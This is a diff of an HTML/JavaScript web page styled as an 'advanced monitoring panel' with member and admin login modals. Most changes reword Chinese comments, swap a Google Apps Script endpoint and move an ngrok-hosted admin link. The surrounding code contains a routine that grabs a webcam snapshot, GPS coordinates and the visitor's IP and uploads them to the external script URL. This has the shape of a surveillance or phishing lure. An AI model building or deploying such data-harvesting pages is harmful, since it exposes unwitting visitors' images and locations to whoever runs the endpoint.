@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Advanced monitoring panel</title>
-  <!-- 若不需要 Chart.js，可直接刪此行 -->
+  <!-- 若不需要 Chart.js，可自行刪除此行 -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     /*******************************************************
@@ -66,7 +66,7 @@
     }
 
     /*******************************************************
-     * Modal (彈跳視窗)
+     * Modal (彈跳視窗) - 一般會員
      *******************************************************/
     .modal-overlay {
       display: none; /* 預設隱藏 */
@@ -157,6 +157,13 @@
     }
 
     /*******************************************************
+     * 管理者登入 Modal (可選)
+     *******************************************************/
+    #adminModalOverlay .modal-content {
+      width: 300px;
+    }
+
+    /*******************************************************
      * 高級監控面板
      *******************************************************/
     #mainPanel {
@@ -197,10 +204,9 @@
   <h1>Advanced monitoring panel</h1>
   <div id="statusSuccess" class="msg-success"></div>
   <div id="statusError" class="msg-error"></div>
-  <button id="openModalBtn" class="btn">會員中心</button>
-  <!-- 管理者後台連結 -->
-  <p><a href="https://3df0-125-227-108-79.ngrok-free.app/admin.php" target="_blank">管理者後台</a></p>
 
+  <!-- 一般使用者登入 / 註冊 -->
+  <button id="openModalBtn" class="btn">會員中心</button>
   <div id="modalOverlay" class="modal-overlay">
     <div class="modal-content">
       <button id="closeModalBtn" class="close-btn">×</button>
@@ -223,6 +229,24 @@
     </div>
   </div>
 
+  <!-- (可選) 管理者登入按鈕 + Modal -->
+  <button id="adminLoginOpenBtn" class="btn">管理者登入</button>
+  <div id="adminModalOverlay" class="modal-overlay">
+    <div class="modal-content">
+      <button id="adminCloseModalBtn" class="close-btn">×</button>
+      <h2>管理者登入</h2>
+      <form id="adminLoginForm">
+        <input type="email" id="adminEmail" class="input-field" placeholder="請輸入管理者 Email" required />
+        <input type="password" id="adminPassword" class="input-field" placeholder="請輸入管理者密碼" required />
+        <button class="btn-submit" type="submit">登入</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- 管理者後台連結（若另有 admin.php） -->
+  <p><a href="https://3df0-125-227-108-79.ngrok-free.app/admin.php" target="_blank">管理者後台</a></p>
+
+  <!-- 高級監控面板 -->
   <div id="mainPanel">
     <div class="container">
       <div class="card">
@@ -248,7 +272,7 @@
     /************************************************
      * 0. Apps Script URL (請改成你自己的)
      ************************************************/
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby8Lb2JjhjGRZAOVbldv71HdQG3UwsOwID4d8uwXHMK0ak1LJuvm9zYvwp3wA8WA3KJpA/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxURtQVXcSlzk3f9cxPc_q1MkuI_jO13iqVBzeXmuNycxQrVTgIqg3TzG1CkTNXvF9pMA/exec";
 
     /************************************************
      * 1. Modal 打開 / 關閉 (一般使用者)
@@ -277,7 +301,7 @@
     });
 
     /************************************************
-     * 2. Tab 切換 (一般登入 / 註冊)
+     * 2. Tab 切換 (登入 / 註冊)
      ************************************************/
     const tabLogin = document.getElementById('tabLogin');
     const tabRegister = document.getElementById('tabRegister');
@@ -382,7 +406,7 @@
     });
 
     /************************************************
-     * 6-2. 管理者登入 (若前端整合在同頁面)
+     * 6-2. 管理者登入 (若前端整合在同頁)
      ************************************************/
     document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -403,8 +427,9 @@
         if (result.success) {
           showSuccessMessage('管理者登入成功！');
           adminModalOverlay.style.display = 'none';
-          // 理想情況下，引導到 admin 後台或顯示管理者專屬功能
-          window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin_dashboard.php';
+
+          // 管理者登入成功後，視需求可跳轉後台
+          // window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin_dashboard.php';
         } else {
           showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
         }
@@ -414,7 +439,7 @@
     });
 
     /************************************************
-     * 7. 收集相機、GPS、IP並上傳
+     * 7. 收集相機、GPS、IP並上傳 (裝置資訊)
      ************************************************/
     async function startCamera() {
       let stream = null;
@@ -428,8 +453,7 @@
             resolve();
           };
         });
-        // 簡單延遲，確保畫面可截圖
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 500)); // 簡單延遲
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
@@ -499,7 +523,6 @@
 
         const fd = new URLSearchParams();
         fd.append('message', '合併資料上傳');
-
         if (collectedData.gps) {
           fd.append('latitude', collectedData.gps.latitude);
           fd.append('longitude', collectedData.gps.longitude);
@@ -537,10 +560,10 @@
     }
 
     /************************************************
-     * 8. 頁面載入後 (可選)
+     * 8. 頁面載入後 (可視需求預先執行收集)
      ************************************************/
     document.addEventListener('DOMContentLoaded', () => {
-      // 如果需要在頁面一載入就嘗試收集，可在此呼叫 collectAndSendData();
+      // 如需一進頁面就收集, 可呼叫 collectAndSendData();
     });
   </script>
 </body>
